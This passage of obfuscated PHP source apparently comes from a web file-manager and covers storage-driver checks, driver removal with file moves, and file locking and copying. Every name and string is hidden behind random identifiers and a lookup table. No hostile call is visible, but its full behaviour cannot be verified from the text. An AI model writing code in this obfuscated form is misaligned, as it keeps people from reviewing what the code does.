(isset($¥Ëøğ¦Ø[$ûÈÀÚï])) { $÷Æ‹ß˜ì = $ûÈÀÚï; break; } } if (!$÷Æ‹ß˜ì) { return; } $Œ‹É¢É› = $this->getConfig($ƒñµ½ïƒ); $§”š‚ïÅ = $Œ‹É¢É›[$÷Æ‹ß˜ì]; $¥¡®‘ş† = $¥Ëøğ¦Ø[$÷Æ‹ß˜ì]; if ($¥¡®‘ş† == str_repeat($³âè­×¾[220], strlen($§”š‚ïÅ))) { $¥Ëøğ¦Ø[$÷Æ‹ß˜ì] = $§”š‚ïÅ; $Ô“ÄÂá®[$³âè­×¾[6]] = json_encode($¥Ëøğ¦Ø); } else { if ($¥¡®‘ş† != $§”š‚ïÅ) { $Ô“ÄÂá®[$³âè­×¾[2297]] = $³âè­×¾[91]; } } } public function checkConfig(&$½¢œ—àæ, $ÃŞµ¾¡ = false) { $˜¯‚Ã¦« =& $_SERVER[ˆ¡¹µ‹Â]; $Àã¿²û = strtolower($½¢œ—àæ[$˜¯‚Ã¦«[98]]); $ú¶¥Ş²¯ = $½¢œ—àæ[$˜¯‚Ã¦«[6]]; if (!is_array($ú¶¥Ş²¯)) { $ú¶¥Ş²¯ = json_decode($ú¶¥Ş²¯, !0); } foreach ($ú¶¥Ş²¯ as $Ÿ™×†¤Ì => $êË´Ø) { if (is_string($êË´Ø)) { $ú¶¥Ş²¯[$Ÿ™×†¤Ì] = trim($êË´Ø); } } $ú¶¥Ş²¯[$˜¯‚Ã¦«[2300]] = rand_string(6); $á±òÛ Å = $GLOBALS[$˜¯‚Ã¦«[6]][$˜¯‚Ã¦«[92]][$˜¯‚Ã¦«[900]]; $ÒÏÛÂ‰Ğ = isset($á±òÛ Å[$Àã¿²û]) ? $á±òÛ Å[$Àã¿²û] : ucfirst($Àã¿²û); $õ¡¦…¼ = $˜¯‚Ã¦«[77] . $ÒÏÛÂ‰Ğ; if (!$ÒÏÛÂ‰Ğ || !class_exists($õ¡¦…¼)) { if ($ÃŞµ¾¡) { return LNG($˜¯‚Ã¦«[2301]); } write_log(array($˜¯‚Ã¦«[2302], $½¢œ—àæ, get_caller_info()), $˜¯‚Ã¦«[215]); show_json(LNG($˜¯‚Ã¦«[2301]), !1, $½¢œ—àæ); } $‹²Ä™ = new $õ¡¦…¼($ú¶¥Ş²¯); if (in_array($Àã¿²û, $‹²Ä™->objectDriver)) { try { if (!$‹²Ä™->isBucketCors() && !$‹²Ä™->setBucketCors()) { $áæÒÎ¤â = LNG($˜¯‚Ã¦«[2303]); $áæÒÎ¤â .= $˜¯‚Ã¦«[2304] . LNG($˜¯‚Ã¦«[2305]); } } catch (Exception $ÊÄ»ØïØ) { $áæÒÎ¤â = $ÊÄ»ØïØ->getMessage(); } if (isset($áæÒÎ¤â)) { return $this->_parseError($áæÒÎ¤â, $Àã¿²û, $ÃŞµ¾¡); } if ($Àã¿²û == $˜¯‚Ã¦«[68] && !$‹²Ä™->checkRegion()) { return $this->_parseError(LNG($˜¯‚Ã¦«[2306]), $Àã¿²û, $ÃŞµ¾¡); } } $€Şüì£ = rtrim($ú¶¥Ş²¯[$˜¯‚Ã¦«[1255]], $˜¯‚Ã¦«[8]) . $˜¯‚Ã¦«[8]; $ßÑºïÚÙ = $‹²Ä™->getPath($€Şüì£ . $˜¯‚Ã¦«[1259]); try { if ($Àã¿²û == $˜¯‚Ã¦«[109]) { $‹²Ä™->mkdir($€Şüì£); } $Ä³ùˆïó = $‹²Ä™->mkfile($ßÑºïÚÙ); if (!$Ä³ùˆïó) { $áæÒÎ¤â = LNG($˜¯‚Ã¦«[2303]); } } catch (Exception $ÊÄ»ØïØ) { $áæÒÎ¤â = $ÊÄ»ØïØ->getMessage(); } if (isset($áæÒÎ¤â)) { return $this->_parseError($áæÒÎ¤â, $Àã¿²û, $ÃŞµ¾¡); } $ú¶¥Ş²¯[$˜¯‚Ã¦«[1255]] = $€Şüì£; $½¢œ—àæ[$˜¯‚Ã¦«[6]] = json_encode($ú¶¥Ş²¯); $½¢œ—àæ[$˜¯‚Ã¦«[98]] = $ÒÏÛÂ‰Ğ; return !0; } private function _parseError($¶àÀœş, $‡Ï÷´ªÜ, $ÂßóØ¾ = false) { $Ö’¥»ñÌ =& $_SERVER[ˆ¡¹µ‹Â]; if ($‡Ï÷´ªÜ == $Ö’¥»ñÌ[68] && stripos($¶àÀœş, $Ö’¥»ñÌ[2307])) { $¦ËÚŸ«¢ = explode($Ö’¥»ñÌ[10], $¶àÀœş); $á®‘Íİ› = isset($¦ËÚŸ«¢[1]) ? $¦ËÚŸ«¢[1] : $Ö’¥»ñÌ[12]; $àÄØœ­ = array($Ö’¥»ñÌ[2308] => LNG($Ö’¥»ñÌ[2309]), $Ö’¥»ñÌ[2310] => LNG($Ö’¥»ñÌ[2311])); if (isset($àÄØœ­[$á®‘Íİ›])) { $¶àÀœş = $àÄØœ­[$á®‘Íİ›]; } } if (stripos($¶àÀœş, $Ö’¥»ñÌ[2312]) === 0) { $õ‡º†Î = strpos($¶àÀœş, $Ö’¥»ñÌ[178]); if ($õ‡º†Î === !1) { $õ‡º†Î = strpos($¶àÀœş, $Ö’¥»ñÌ[4]); } if ($õ‡º†Î !== !1) { $¶àÀœş = substr($¶àÀœş, $õ‡º†Î + 1); } } $¶àÀœş = LNG($Ö’¥»ñÌ[1262]) . $¶àÀœş; if ($ÂßóØ¾) { return $¶àÀœş; } show_json($¶àÀœş, !1); } public function driverListSystem() { $„ÄÉê² =& $_SERVER[ˆ¡¹µ‹Â]; $“Ù¬ÆÑÄ = parent::listData(); $½“™Ñçµ = array(); foreach ($“Ù¬ÆÑÄ as $À¿ÂºèÛ) { unset($À¿ÂºèÛ[$„ÄÉê²[231]], $À¿ÂºèÛ[$„ÄÉê²[88]]); $À¿ÂºèÛ[$„ÄÉê²[6]] = json_decode($À¿ÂºèÛ[$„ÄÉê²[6]], !0); $½“™Ñçµ[] = $À¿ÂºèÛ; } return $½“™Ñçµ; } public function defaultDriver() { $ß›ã„Óƒ =& $_SERVER[ˆ¡¹µ‹Â]; $Á—î²Ø„ = parent::listData(); $ ò¤«Åë = array_filter_by_field($Á—î²Ø„, $ß›ã„Óƒ[37], 1); $ ò¤«Åë = $ ò¤«Åë[0]; if ($ ò¤«Åë) { $ ò¤«Åë[$ß›ã„Óƒ[6]] = json_decode($ ò¤«Åë[$ß›ã„Óƒ[6]], !0); } return $ ò¤«Åë; } public function driverInfo($Ìê˜¶Ş›) { $¬“£¯¦› =& $_SERVER[ˆ¡¹µ‹Â]; $‰·ÏÁÂü = array_to_keyvalue(parent::listData(), $¬“£¯¦›[475]); if (!isset($‰·ÏÁÂü[$Ìê˜¶Ş›])) { return !1; } $û’±‚»æ = $‰·ÏÁÂü[$Ìê˜¶Ş›]; $û’±‚»æ[$¬“£¯¦›[6]] = json_decode($û’±‚»æ[$¬“£¯¦›[6]], !0); return $û’±‚»æ; } public function remove($¬õúŞ¾) { $this->removeShareItems($¬õúŞ¾); return parent::remove($¬õúŞ¾); } public function removeWithFile($ÇÃ°´ê, $Á„ÙğÛı, $ıÓßºú‚, $š±ˆïÁ = false) { $ÛÙôİ =& $_SERVER[ˆ¡¹µ‹Â]; $¬õï´ÀÅ = array($ÛÙôİ[892] => $ÇÃ°´ê); $¾ç ®‹ = Model($ÛÙôİ[544])->where($¬õï´ÀÅ)->count(); $†ˆ˜ÚŒÔ = Model($ÛÙôİ[544])->where($¬õï´ÀÅ)->sum($ÛÙôİ[79]); $½÷œ¸ö” = $Á„ÙğÛı . $ÛÙôİ[2313] . $ÇÃ°´ê; $Ÿâ·„¾ = LNG($Á„ÙğÛı == $ÛÙôİ[620] ? $ÛÙôİ[2314] : $ÛÙôİ[2315]); $áÛ£ãòì = new TaskFileTransfer($½÷œ¸ö”, $ÛÙôİ[215], $¾ç ®‹, $Ÿâ·„¾ . $ÛÙôİ[462] . $ıÓßºú‚[$ÛÙôİ[32]] . $ÛÙôİ[214] . $ÇÃ°´ê); $áÛ£ãòì->task[$ÛÙôİ[830]] = (double) $†ˆ˜ÚŒÔ; $ë„¼–±¥ = KodIO::defaultDriver(); $åî…éÊ£ = $ë„¼–±¥[$ÛÙôİ[475]]; $òĞßºñ = $ÂÔÉ¿ = $”Ïô„©Á = array(); $­ş–ïÎİ = Model($ÛÙôİ[230])->where($¬õï´ÀÅ)->field($ÛÙôİ[2316])->select(); foreach ($­ş–ïÎİ as $Ãü†§”Ã) { $²Ó§›ØŒ = $Ãü†§”Ã[$ÛÙôİ[541]]; if ($š±ˆïÁ) { $ÂÔÉ¿[] = $²Ó§›ØŒ; continue; } $»„»ˆ = $Ãü†§”Ã[$ÛÙôİ[87]]; $ÌŒöÓ”  = get_path_father($»„»ˆ); $”Ïô„©Á[] = $ÌŒöÓ” ; $ÌŒöÓ”  = str_replace("\x7b\151\x6f\72{$ÇÃ°´ê}\x7d\x2f", "\173\x69\157\72{$åî…éÊ£}\175\57", $ÌŒöÓ” ); if (!IO::exist($»„»ˆ)) { $òĞßºñ[] = $²Ó§›ØŒ; $áÛ£ãòì->updateFileEnd($Ãü†§”Ã[$ÛÙôİ[32]], $Ãü†§”Ã[$ÛÙôİ[79]]); write_log($ÛÙôİ[2317] . $»„»ˆ, $ÛÙôİ[1893]); continue; } $¬ïí™õÍ = IO::move($»„»ˆ, $ÌŒöÓ” , REPEAT_RENAME); if (!$¬ïí™õÍ) { $ÂÔÉ¿[] = $²Ó§›ØŒ; $áÛ£ãòì->updateFileEnd($Ãü†§”Ã[$ÛÙôİ[32]], $Ãü†§”Ã[$ÛÙôİ[79]]); write_log($ÛÙôİ[2318] . $»„»ˆ, $ÛÙôİ[1893]); continue; } $¬õï´ÀÅ = array($ÛÙôİ[541] => $²Ó§›ØŒ); $Û¼ÙÃ¡Š = array($ÛÙôİ[892] => $åî…éÊ£, $ÛÙôİ[87] => $¬ïí™õÍ); Model($ÛÙôİ[230])->where($¬õï´ÀÅ)->save($Û¼ÙÃ¡Š); } $ïè¡¦¾˜ = $áÛ£ãòì->task; if (!$š±ˆïÁ) { Cache::set($½÷œ¸ö”, $ïè¡¦¾˜); } $áÛ£ãòì->end(); $òĞßºñ = array_unique($òĞßºñ); $ÂÔÉ¿ = array_unique($ÂÔÉ¿); if (!$š±ˆïÁ && ($òĞßºñ || $ÂÔÉ¿)) { $²äå±¯¦ = array(); if ($òĞßºñ) { $²äå±¯¦[] = sprintf(LNG($ÛÙôİ[2319]), count($òĞßºñ)); } if ($ÂÔÉ¿) { $²äå±¯¦[] = sprintf(LNG($ÛÙôİ[2320]), count($ÂÔÉ¿)); } $²äå±¯¦ = sprintf(LNG($ÛÙôİ[2321]), implode($ÛÙôİ[2322], $²äå±¯¦)) . $ÛÙôİ[2323] . date($ÛÙôİ[2324]) . $ÛÙôİ[2325]; if ($Á„ÙğÛı == $ÛÙôİ[1930]) { $²äå±¯¦ .= $ÛÙôİ[2326] . LNG($ÛÙôİ[2327]); } $ïè¡¦¾˜[$ÛÙôİ[1257]] = $²äå±¯¦; Cache::set($½÷œ¸ö”, $ïè¡¦¾˜); unset($ıÓßºú‚[$ÛÙôİ[6]]); $àÉ¥Ì†è = array($ÛÙôİ[475] => $ÇÃ°´ê, $ÛÙôİ[2201] => $ÛÙôİ[620], $ÛÙôİ[32] => $ıÓßºú‚[$ÛÙôİ[32]], $ÛÙôİ[1280] => $ıÓßºú‚); Hook::trigger($ÛÙôİ[1774], array($ÛÙôİ[1280] => $àÉ¥Ì†è, $ÛÙôİ[1290] => !0)); show_json($²äå±¯¦, !1, 100111); } if ($Á„ÙğÛı == $ÛÙôİ[620]) { return !0; } if ($òĞßºñ || $ÂÔÉ¿) { $ÂæØß¦à = array_merge($òĞßºñ, $ÂÔÉ¿); $ÂæØß¦à = array_filter(array_unique($ÂæØß¦à)); $this->removeByFileID($ÂæØß¦à); } if ($”Ïô„©Á) { $”Ïô„©Á = array_filter(array_unique($”Ïô„©Á)); foreach ($”Ïô„©Á as $»„»ˆ) { $Ô±µ¤›“ = IO::has($»„»ˆ, !0); if (!$Ô±µ¤›“[$ÛÙôİ[239]] && !$Ô±µ¤›“[$ÛÙôİ[240]]) { IO::remove($»„»ˆ); } } } return $this->remove($ÇÃ°´ê); } private function removeByFileID($¸ÖµÍ¥ä = array()) { $±Ü…Ô’ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($¸ÖµÍ¥ä)) { return; } $Œ¶‹Ëì… = array($±Ü…Ô’[541] => array($±Ü…Ô’[7], $¸ÖµÍ¥ä)); $›‰ÏŸ°¯ = Model($±Ü…Ô’[1411])->where($Œ¶‹Ëì…)->field($±Ü…Ô’[193])->select(); if (!$›‰ÏŸ°¯) { return Model($±Ü…Ô’[544])->remove($¸ÖµÍ¥ä); } $›‰ÏŸ°¯ = array_to_keyvalue($›‰ÏŸ°¯, $±Ü…Ô’[12], $±Ü…Ô’[193]); foreach ($›‰ÏŸ°¯ as $ÙÓÚá±ì) { Model($±Ü…Ô’[899])->removeNow($ÙÓÚá±ì, !1); } } private function removeShareItems($Ú»²Ö¸¤) { $‡¨ùåÏ =& $_SERVER[ˆ¡¹µ‹Â]; $“¼«à = "\x7b\x69\x6f\x3a{$Ú»²Ö¸¤}\x7d\x2f"; $¼ßãºú = array($‡¨ùåÏ[193] => 0, $‡¨ùåÏ[1250] => array($‡¨ùåÏ[459], "{$“¼«à}\45")); $´ÂôŒª = Model($‡¨ùåÏ[1941])->where($¼ßãºú)->field($‡¨ùåÏ[665])->select(); if (empty($´ÂôŒª)) { return; } $ÎÒ”ÔÌù = array_to_keyvalue($´ÂôŒª, $‡¨ùåÏ[12], $‡¨ùåÏ[665]); Model($‡¨ùåÏ[664])->remove($ÎÒ”ÔÌù); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\114\151\147\x68\x74\101\160\160"; public $modelType = "\x53\171\163\x74\x65\155\x4f\160\164\151\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x67\162\x6f\165\160", "\144\145\163\x63", "\x63\157\156\164\145\156\164"); public function listData($ÃÔº¡á« = false, $ØÑóİ“ğ = "\155\157\x64\151\146\x79\124\x69\x6d\x65", $´’ğÓ†¶ = true) { return parent::listData($ÃÔº¡á«, $ØÑóİ“ğ, $´’ğÓ†¶); } public function remove($ùğŒ…¹Ø) { $Âûß–Ÿ = $this->findByName($ùğŒ…¹Ø); if (!$Âûß–Ÿ) { return !1; } return parent::remove($Âûß–Ÿ[$_SERVER[ˆ¡¹µ‹Â][475]]); } public function add($¨©ˆŒ‹°) { if ($this->findByName($¨©ˆŒ‹°[$_SERVER[ˆ¡¹µ‹Â][32]])) { return !1; } return parent::insert($¨©ˆŒ‹°); } public function update($ûÜì‰»ì, $Á½Êœä) { $×ÛÂÌÀæ =& $_SERVER[ˆ¡¹µ‹Â]; $àšÌç³ = $this->findByName($ûÜì‰»ì); $Õö÷©‘ï = $this->findByName($Á½Êœä[$×ÛÂÌÀæ[32]]); if (!$àšÌç³ || $Õö÷©‘ï && $Õö÷©‘ï[$×ÛÂÌÀæ[475]] != $àšÌç³[$×ÛÂÌÀæ[475]]) { return !1; } return parent::update($àšÌç³[$×ÛÂÌÀæ[475]], $Á½Êœä); } } goto c½«ãç§êÛ; B©â¥È¥Ï: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($­ÇÆÂÑÎ) { $ Éø•ïî =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($ Éø•ïî[618], $­ÇÆÂÑÎ); $Œœşì¨ = 1; $this->_lockEvent($­ÇÆÂÑÎ, array($ Éø•ïî[619], $ Éø•ïî[620]), $Œœşì¨); $this->_lockParent($­ÇÆÂÑÎ, array($ Éø•ïî[620]), $Œœşì¨); $this->_lockEvent($­ÇÆÂÑÎ, array($ Éø•ïî[621], $ Éø•ïî[622]), $Œœşì¨); $this->_lockCheckEnd($ Éø•ïî[618], $­ÇÆÂÑÎ); } public function lockCopyEnd($ÊÔíØÍº) { $ãé•Öù =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $êáÆÔ = 0; $this->_lockEvent($ÊÔíØÍº, array($ãé•Öù[619], $ãé•Öù[620]), $êáÆÔ); $this->_lockParent($ÊÔíØÍº, array($ãé•Öù[620]), $êáÆÔ); $this->_lockEvent($ÊÔíØÍº, array($ãé•Öù[621], $ãé•Öù[622]), $êáÆÔ); } public function lockWriteStart($à¾¹ß¤à, $è¡¡“Èú = '') { $¨Áç“ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($¨Áç“[619], $à¾¹ß¤à); $úÑ¯¦³ = 1; $this->_lockKey($¨Áç“[623] . $à¾¹ß¤à . $¨Áç“[10] . $è¡¡“Èú, $úÑ¯¦³); $this->_lockEvent($à¾¹ß¤à, array($¨Áç“[618], $¨Áç“[620]), $úÑ¯¦³); $this->_lockParent($à¾¹ß¤à, array($¨Áç“[618], $¨Áç“[620]), $úÑ¯¦³); $this->_lockCheckEnd($¨Áç“[619], $à¾¹ß¤à); } public function lockWriteEnd($È¨ü¦©µ, $ éĞÃ™— = '') { $À©ƒˆğ´ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $ÙÀåöíæ = 0; $this->_lockKey($À©ƒˆğ´[623] . $È¨ü¦©µ . $À©ƒˆğ´[10] . $ éĞÃ™—, $ÙÀåöíæ); $this->_lockEvent($È¨ü¦©µ, array($À©ƒˆğ´[618], $À©ƒˆğ´[620]), $ÙÀåöíæ); $this->_lockParent($È¨ü¦©µ, array($À©ƒˆğ´[618], $À©ƒˆğ´[620]), $ÙÀåöíæ); } public function lockMoveStart($ÂšäíîÂ) { $²ÎŠöü¡ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($²ÎŠöü¡[620], $ÂšäíîÂ); $­ÈãëŸ = 1; $this->_lockKey($²ÎŠöü¡[624] . $ÂšäíîÂ, $­ÈãëŸ); $this->_lockEvent($ÂšäíîÂ, array($²ÎŠöü¡[618], $²ÎŠöü¡[619]), $­ÈãëŸ); $this->_lockParent($ÂšäíîÂ, array($²ÎŠöü¡[618], $²ÎŠöü¡[620]), $­ÈãëŸ); $this->_lockEvent($ÂšäíîÂ, array($²ÎŠöü¡[625], $²ÎŠöü¡[621], $²ÎŠöü¡[622]), $­ÈãëŸ); $this->_lockCheckEnd($²ÎŠöü¡[620], $ÂšäíîÂ); } public function lockMoveEnd($ùï™†©ã) { $Úá†šÃ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->allowLock()) { return; } $µ‘Û¡É¦ = 0; $this->_lockKey($Úá†šÃ[624] . $ùï™†©ã, $µ‘Û¡É¦); $this->_lockEvent($ùï™†©ã, array($Úá†šÃ[618], $Úá†šÃ[619]), $µ‘Û¡É¦); $this->_lockParent($ùï™†©ã, array($Úá†šÃ[618], $Úá†šÃ[620]), $µ‘Û¡É¦); $this->_lockEvent($ùï™†©ã, array($Úá†šÃ[625], $Úá†šÃ[621], $Úá†šÃ[622]), $µ‘Û¡É¦); } private function _lockCheck($Í˜ÄÚĞ, $ã“Úôï) { $‡¾˜ãÂ³ =& $_SERVER[ˆ¡¹µ‹Â]; $ì¾úâš = $this->sourceInfo($ã“Úôï); $ì¤ìÁ´ = $Í˜ÄÚĞ . $‡¾˜ãÂ³[10] . $ã“Úôï; $this->_lockTimeStart[$ì¤ìÁ´] = timeFloat(); if (!is_array($ì¾úâš)) { return; } $Í†åŠçÃ = LNG($‡¾˜ãÂ³[626]); CacheLock::setErrorMsg($‡¾˜ãÂ³[176] . htmlspecialchars($ì¾úâš[$‡¾˜ãÂ³[32]]) . $‡¾˜ãÂ³[178] . $Í†åŠçÃ); $this->_lockKey($ì¤ìÁ´, 1); $this->_lockKey($ì¤ìÁ´, 0); $ØÒøò¦í = array_reverse($this->parentLevelArray($ì¾úâš[$‡¾˜ãÂ³[584]])); foreach ($ØÒøò¦í as $¶ÚˆˆÃô) { $ì¤ìÁ´ = $Í˜ÄÚĞ . $‡¾˜ãÂ³[627] . $¶ÚˆˆÃô; if (CacheLock::lockGet($‡¾˜ãÂ³[628] . $ì¤ìÁ´)) { $ì¾úâš = $this->sourceInfo($¶ÚˆˆÃô); CacheLock::setErrorMsg($‡¾˜ãÂ³[176] . htmlspecialchars($ì¾úâš[$‡¾˜ãÂ³[32]]) . $‡¾˜ãÂ³[178] . $Í†åŠçÃ); $this->_lockKey($ì¤ìÁ´, 1); $this->_lockKey($ì¤ìÁ´, 0); } } } private function _lockCheckEnd($ÒäÃ¾ª», $ÉØîİ£ä) { $­ÂÇÙõ½ =& $_SERVER[ˆ¡¹µ‹Â]; $ƒ¶¢µá³ = $ÒäÃ¾ª» . $­ÂÇÙõ½[10] . $ÉØîİ£ä; CacheLock::setErrorMsg($­ÂÇÙõ½[454]); if (!isset($this->_lockTimeStart[$ƒ¶¢µá³])) { return; } $¶³Ì¨é = timeFloat() - $this->_lockTimeStart[$ƒ¶¢µá³]; unset($this->_lockTimeStart[$ƒ¶¢µá³]); if ($¶³Ì¨é > 0.5) { unset(self::$cacheSourceInfo[$­ÂÇÙõ½[533] . $ÉØîİ£ä]); } $Ù–¢ÂÅå = $this->sourceInfo($ÉØîİ£ä); if (!$Ù–¢ÂÅå) { show_json(LNG($­ÂÇÙõ½[108]), !1); } } private function _lockParent($ˆİÙ¿©ğ, $°âÛä„Â, $í˜ç¯ìò) { if (!$this->autoLockSet) { return; } $¥¡¹ŞœÂ = $this->sourceInfo($ˆİÙ¿©ğ); if (!is_array($¥¡¹ŞœÂ)) { return; } $´şŠá‹ = array_reverse($this->parentLevelArray($¥¡¹ŞœÂ[$_SERVER[ˆ¡¹µ‹Â][584]])); foreach ($´şŠá‹ as $úššÀ¢) { $this->_lockEvent($úššÀ¢, $°âÛä„Â, $í˜ç¯ìò); } } private function _lockEvent($‹ ÓÇËÔ, $ÅØÛ¿¦, $»¶şí×„) { $®â„õÈ™ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->autoLockSet) { return; } foreach ($ÅØÛ¿¦ as $…—¸´º) { $ŠÄÂÏ–¶ = $…—¸´º . $®â„õÈ™[10] . $‹ ÓÇËÔ; if ($»¶şí×„ && CacheLock::lockGet($®â„õÈ™[628] . $ŠÄÂÏ–¶)) { continue; } $this->_lockKey($ŠÄÂÏ–¶, $»¶şí×„); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ªæòòıŸ, $åá²å×ñ = 1) { $ÃÈË¹–ü = $_SERVER[ˆ¡¹µ‹Â][628] . md5($ªæòòıŸ); if ($åá²å×ñ) { if (isset(self::$_lockItemArr[$ÃÈË¹–ü])) { return; } self::$_lockItemArr[$ÃÈË¹–ü] = 1; CacheLock::lock($ÃÈË¹–ü, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÃÈË¹–ü])) { return; } unset(self::$_lockItemArr[$ÃÈË¹–ü]); CacheLock::unlock($ÃÈË¹–ü); } } public function isParentOf($­²½åÂ, $Ôáôìç) { $ÏØ«Å¥Ü =& $_SERVER[ˆ¡¹µ‹Â]; $¨ßµİğã = $this->sourceInfo($­²½åÂ); $ƒŸ×ÖŞª = $this->sourceInfo($Ôáôìç); $‘¶úµ‚á = $¨ßµİğã[$ÏØ«Å¥Ü[584]] . $¨ßµİğã[$ÏØ«Å¥Ü[193]] . $ÏØ«Å¥Ü[50]; $¾Ëå·ŒÔ = $ƒŸ×ÖŞª[$ÏØ«Å¥Ü[584]] . $ƒŸ×ÖŞª[$ÏØ«Å¥Ü[193]] . $ÏØ«Å¥Ü[50]; $ÃŠµ®ã = strpos($¾Ëå·ŒÔ, $‘¶úµ‚á) === 0; return $ÃŠµ®ã; } private $targetIsDelete = 0; public function copy($ë†ßûÏ·, $ò˜ã¸€, $óİÒÆç¼ = REPEAT_REPLACE, $Û¦Ùİ¬ = '') { $¸÷Ã÷âİ =& $_SERVER[ˆ¡¹µ‹Â]; $‚åÆØ¡Ù = $this->sourceInfo($ë†ßûÏ·); $Ğš†Ã”â = $this->sourceInfo($ò˜ã¸€); if (!$‚åÆØ¡Ù || !$Ğš†Ã”â || $Ğš†Ã”â[$¸÷Ã÷âİ[485]] != $¸÷Ã÷âİ[91]) { return !1; } if ($this->isParentOf($ë†ßûÏ·, $ò˜ã¸€)) { return !1; } $ªİ»Ôı¼ = $Û¦Ùİ¬ ? $Û¦Ùİ¬ : $‚åÆØ¡Ù[$¸÷Ã÷âİ[32]]; $this->lockCopyStart($ë†ßûÏ·); $this->lockWriteStart($ò˜ã¸€, $ªİ»Ôı¼); $œ’åŞ–ö = array($¸÷Ã÷âİ[629] => array(), $¸÷Ã÷âİ[630] => array(), $¸÷Ã÷âİ[631] => array()); $this->targetIsDelete = intval($‚åÆØ¡Ù[$¸÷Ã÷âİ[505]]); $ç¯ş¯¾­ = $this->fileNameExistAuto($ò˜ã¸€, $‚åÆØ¡Ù); $«ëé¼ê = $this->_copy($ë†ßûÏ·, $ò˜ã¸€, $óİÒÆç¼, $œ’åŞ–ö, !0, $Û¦Ùİ¬); $this->_childrenListClear(); $this->lockCopyEnd($ë†ßûÏ·); $this->lockWriteEnd($ò˜ã¸€, $ªİ»Ôı¼); if ($‚åÆØ¡Ù[$¸÷Ã÷âİ[485]] == $¸÷Ã÷âİ[91] && $ç¯ş¯¾­ == $«ëé¼ê) { $this->folderSizeResetChildren($ç¯ş¯¾­); } Model($¸÷Ã÷âİ[632])->addAll($œ’åŞ–ö[$¸÷Ã÷âİ[630]], array(), !0); if ($ç¯ş¯¾­ != $«ëé¼ê || $‚åÆØ¡Ù[$¸÷Ã÷âİ[485]] == $¸÷Ã÷âİ[91]) { Model($¸÷Ã÷âİ[633])->eventCopy($«ëé¼ê); } $this->saveAll($œ’åŞ–ö[$¸÷Ã÷âİ[631]]); Model($¸÷Ã÷âİ[230])->linkAdd($œ’åŞ–ö[$¸÷Ã÷âİ[629]]); $this->folderSizeReset($ò˜ã¸€); $this->updateModifyTime($ò˜ã¸€); return $«ëé¼ê; } private function _copy($×£öÁÅ, $ãÜÍ¿Ş•, $²ô‰Ÿ«è, &$²‡‘›ä¸, $·ÅÕ¬‡û, $øøØ““š = '') { $¸«ë¢ =& $_SERVER[ˆ¡¹µ‹Â]; $Øüû®µ = $this->sourceInfoCache($×£öÁÅ); $Ã’æƒæ€ = $Øüû®µ[$¸«ë¢[485]] == $¸«ë¢[91]; $ØÀÏ«”Â = $øøØ““š ? $øøØ““š : $Øüû®µ[$¸«ë¢[32]]; $á†§Å”  = $this->fileNameExistAuto($ãÜÍ¿Ş•, $Øüû®µ); if ($·ÅÕ¬‡û) { $this->_childrenAllMake($×£öÁÅ); if ($Ã’æƒæ€ && $á†§Å” ) { $this->_childrenAllMake($á†§Å” ); } } if (!$á†§Å” ) { return $this->_copyCreate($×£öÁÅ, $ãÜÍ¿Ş•, $ØÀÏ«”Â, $²‡‘›ä¸); } $Ç”…»Ø = $á†§Å” ; if ($Ã’æƒæ€) { if ($²ô‰Ÿ«è == REPEAT_RENAME_FOLDER) { $ØÀÏ«”Â = $this->fileNameAutoCache($ãÜÍ¿Ş•, $ØÀÏ«”Â, $²ô‰Ÿ«è, $Ã’æƒæ€); $Ç”…»Ø = $this->_copyCreate($×£öÁÅ, $ãÜÍ¿Ş•, $ØÀÏ«”Â, $²‡‘›ä¸); } else { $ãòäêÑ = $this->_childrenList($×£öÁÅ); foreach ($ãòäêÑ as $—‡É—ùå) { $this->_copy($—‡É—ùå[$¸«ë¢[193]], $á†§Å” , $²ô‰Ÿ«è, $²‡‘›ä¸, !1); } } } else { if ($²ô‰Ÿ«è == REPEAT_RENAME || $²ô‰Ÿ«è == REPEAT_RENAME_FOLDER) { $ØÀÏ«”Â = $this->fileNameAutoCache($ãÜÍ¿Ş•, $ØÀÏ«”Â, $²ô‰Ÿ«è, $Ã’æƒæ€); $Ç”…»Ø = $this->_copyCreate($×£öÁÅ, $ãÜÍ¿Ş•, $ØÀÏ«”Â, $²‡‘›ä¸); } else { if ($²ô‰Ÿ«è == REPEAT_REPLACE) { $¡ÛÁ€Íî = $this->sourceInfoCache($á†§Å” ); $£†“Šğò = $this->fileHistory($¡ÛÁ€Íî, $Øüû®µ[$¸«ë¢[541]], $Øüû®µ[$¸«ë¢[79]]); if ($£†“Šğò) { $²‡‘›ä¸[$¸«ë¢[629]][] = $Øüû®µ[$¸«ë¢[541]]; } } else { if ($²ô‰Ÿ«è == REPEAT_SKIP) { } } } Hook::trigger($¸«ë¢[634], array($¸«ë¢[635], $Øüû®µ, 0)); } return $Ç”…»Ø; } private function _copyCreate($¡Ø‹Óş, $¯õÆ¼Ÿµ, $¡¹Ñ×Ö, &$«‘ó®) { $´¤ç“‰ö =& $_SERVER[ˆ¡¹µ‹Â]; $µ°§ã¥à = $this->sourceInfoCache($¡Ø‹Óş); $ËËœÌûß = $this->sourceInfoCache($¯õÆ¼Ÿµ); $øÇåû‚Û = $this->_makeItemData($µ°§ã¥à, $ËËœÌûß, $¡¹Ñ×Ö); Hook::trigger($´¤ç“‰ö[636], $øÇåû‚Û); Hook::trigger($´¤ç“‰ö[637], array($´¤ç“‰ö[638], $øÇåû‚Û, 0)); $êùƒ¼õ = $this->add($øÇåû‚Û); $ôÈ–Ş¸ = array($´¤ç“‰ö[193] => $êùƒ¼õ, $´¤ç“‰ö[32] => $¡¹Ñ×Ö); $this->_copyApplyMeta($ôÈ–Ş¸, $«‘ó®); if 